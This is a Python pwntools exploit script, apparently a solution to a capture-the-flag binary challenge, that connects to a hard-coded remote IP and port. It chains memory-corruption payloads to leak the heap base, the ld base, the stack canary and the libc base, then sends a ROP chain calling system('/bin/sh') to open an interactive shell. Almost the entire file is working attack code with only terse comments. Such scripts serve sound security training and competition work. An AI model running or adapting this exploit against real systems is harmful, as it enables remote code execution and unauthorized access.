#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('main_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
ld = ELF('ld-2.35.so', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # b*main+148
        # b*unpack+79
        # b*main+790
        b*0x4025AA 
        b*0x0402692   
        c
        ''')
        sleep(1)

#  nc 67.223.119.69 3637 
if args.REMOTE:
    p = remote('67.223.119.69', 3637)
    # p = remote('0', 1338)
else:
    p = process([exe.path])

# pad to make a free chunk --> leak heap base
load = flat(
    p32(0x100), # choice in main
    # arr[0]
    p8(0x0),
    0xcafebabe,
    # arr[1]
    # p8(3),
    # b'evilsad.',
    p8(0x2),
    p32(0),
    b'evil is here'

)
sa(b'> ', load)

# save heap base into admin_str

load = flat(
    p32(0x1337), # choice in main
    # arr[0]
    p8(0x0),
    0xcafebabe,
   # arr[1]
    p8(0x2),
    p32(0),
)
sa(b'> ', load)

# heap leak

load = flat(
    p32(0x700), # choice in main
)

sa(b'> ', load)
ru(b'admin: ')

heap_base = u32(r(2).ljust(4, b'\0')) << 12
info(f'heap base: {hex(heap_base)}')


load = flat(
    p32(0x1337), # choice in main
    # arr[0]
    p8(0x0),
    0x20,
    p8(0x2),
    p32(0x1aa8),
    b's'*(0x1aa8),
)
# admin_str: 0x7fffffffab70
sa(b'> ', load)


load = flat(
    p32(0x700), # choice in main
)
info(f'start leak ld')
sa(b'> ', load)

a = p.recvuntil(b'No data available !', drop=True)
info(f'---------------------------------------------------------')
print(a)
ld_leak = u64(a[len(a)-8:len(a)-2] + b'\0\0')
ld.address = ld_leak - 0x9da5

info(f'ld leak: {hex(ld_leak)}')
info(f'ld base: {hex(ld.address)}')

# control size of 0xdead option
load = flat(
    p32(0x1337), # choice in main
    # arr[0]
    p8(0x0),
    0x29,
    p8(0x2),
    p32(0x2fe0),
    b'\0'*(0x2fe0),
)
sa(b'> ', load)

# control IDX_3
load = flat(
    p32(0x1337), # choice in main
    # arr[0]
    p8(0x0),
    0xfffff,
    p8(0x2),
    p32(0x2fe0),
    b'w'*(0x2fe0),
)

sa(b'> ', load)

# admin_str: 0x7fffffffab70
# rip 0x7fffffffdb88
"""
canary: 0x7fffffffdb78
"""
# 0x49
sa(b'> ', load)

load = flat(
    p32(0xdead), # choice in main
    # arr[0]
    p8(2),
    p32(0x60),
    b'f'*0x60
)
sa(b'> ', load)

load = flat(
    p32(0x700), # choice in main
)
info(f'start leak canary')
sa(b'> ', load)

a = p.recvuntil(b'No data available !', drop=True)
info(f'---------------------------------------------------------')
print(a)
canary = u64(a[len(a)-10:len(a)-3] + b'\0') << 8
info(f'canary: {hex(canary)}')

######################## part 2 ###############################################
load = flat(
    p32(0x1337), # choice in main
    # arr[0]
    p8(0x0),
    0x38,
    p8(0x2),
    p32(0x36),
    b'\0'*(0x36),
)
sa(b'> ', load)


load = flat(
    p32(0x1337), # choice in main
    # arr[0]
    p8(0x0),
    0xfffff,
    p8(0x2),
    p32(0x2fe0),
    b'w'*(0x2fe0),
)

sa(b'> ', load)

# leak libc
load = flat(
    p32(0xdead), # choice in main
    # arr[0]
    p8(2),
    p32(0x60),
    b'f'*0x60
)
sa(b'> ', load)

load = flat(
    p32(0x700), # choice in main
)
info(f'-'*0x10)
info(f'leak libc')
sa(b'> ', load)

a = p.recvuntil(b'No data available !', drop=True)
info(f'---------------------------------------------------------')
print(a)
libc_leak = u64(a[len(a)-8:len(a)-2] + b'\0\0')
libc.address = libc_leak - 0x29d90
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')
GDB()

## control size again to win
load = flat(
    p32(0x1337), # choice in main
    # arr[0]
    p8(0x0),
    0x100,
    p8(0x2),
    p32(0x2fe0),
    b'\0'*(0x2fe0),
)
sa(b'> ', load)

# control IDX_3
load = flat(
    p32(0x1337), # choice in main
    # arr[0]
    p8(0x0),
    0xfffff,
    p8(0x2),
    p32(0x2fe0),
    b'h'*(0x2fe0),
)

sa(b'> ', load)

# admin_str: 0x7fffffffab70
# rip 0x7fffffffdb88
"""
canary: 0x7fffffffdb78
"""
# 0x49
"""
canary: 0x28
libc: 0x38
"""
pop_rdi  =0x000000000002a3e5 + libc.address

win = flat(
    canary,
    1,
    pop_rdi+1,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.sym.system
)

load = flat(
    p32(0xdead), # choice in main
    # arr[0]
    p8(2),
    p32(0x100),
    b'a'*0x28,
    win.ljust(0x100-0x28, b'k')
)
sa(b'> ', load)
sa(b'> ', b'1')

# 0x9da5
p.interactive()

"""

typedef struct{
    int idx;

}
"""
